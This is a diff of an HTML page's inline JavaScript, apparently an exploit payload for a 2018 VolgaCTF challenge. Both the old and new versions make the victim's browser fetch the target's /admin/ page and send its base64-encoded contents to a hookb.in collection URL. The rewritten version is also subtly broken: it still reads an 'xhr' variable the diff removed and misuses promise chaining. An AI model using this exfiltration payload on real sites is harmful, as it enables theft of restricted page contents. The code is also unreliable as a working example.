@@ -5,17 +5,17 @@
 </head>
 <body>
 <script type="text/javascript">
-	var img = new Image();
-	img.src = "https://hookb.in/ZMNGrV5X?start=0";
-	
-	var xhr = new XMLHttpRequest();
-	xhr.open("GET", "http://seo-kings.quals.2018.volgactf.ru:8080/admin/", true);
-	xhr.send();
-	xhr.onload = function (e) {
-		var j = new Image();
-		j.src = "https://hookb.in/ZMNGrV5X?0=" + window.btoa(xhr.responseText);
-	}
+	var url = "http://seo-kings.quals.2018.volgactf.ru:8080/admin/";
+	var hook = "https://hookb.in/ZMNGrV5X";
 
+	fetch(hook+"?start=1").then(
+		fetch(url).then(
+			function(response){
+				return response.text()
+			}).then(function(page){
+				fetch(hook + "?page=" + window.btoa(xhr.responseText)).then('Ok','Error')
+			});
+	);
 </script>
 </body>
 </html>
